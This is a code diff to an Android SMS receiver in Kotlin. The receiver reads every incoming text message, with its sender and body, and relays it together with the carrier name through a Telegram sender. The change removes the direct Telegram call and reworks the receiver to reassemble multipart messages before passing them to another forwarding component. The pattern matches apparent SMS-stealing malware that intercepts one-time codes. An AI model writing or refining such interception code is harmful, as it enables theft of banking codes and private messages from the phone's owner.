@@ -30,18 +30,18 @@ class SmsBroadcastReceiver : BroadcastReceiver() {
                 val operatorName = tm?.networkOperatorName ?: ""
 
                 if (!messages.isNullOrEmpty()) {
-                    for (sms in messages) {
-                        val sender = sms.originatingAddress ?: "SMS"
-                        val body = sms.messageBody ?: ""
-
-                        TelegramSender.forwardPayloadSync(
-                            type = "sms",
-                            sender = sender,
-                            text = body,
-                            appName = "SMS",
-                            packageName = "com.android.sms",
-                            operator = operatorName
-                        )
+                    // Group parts by sender (address) and assemble all segments
+                    val grouped = messages.groupBy { it.originatingAddress ?: "SMS" }
+                    for ((sender, smsList) in grouped) {
+                        val fullText = smsList.joinToString("") { it.messageBody ?: "" }
+                        if (fullText.isNotBlank()) {
+                            SmsAssembler.onSmsReceived(
+                                context = context.applicationContext,
+                                sender = sender,
+                                text = fullText,
+                                operator = operatorName
+                            )
+                        }
                     }
                 }
             } catch (e: Exception) {
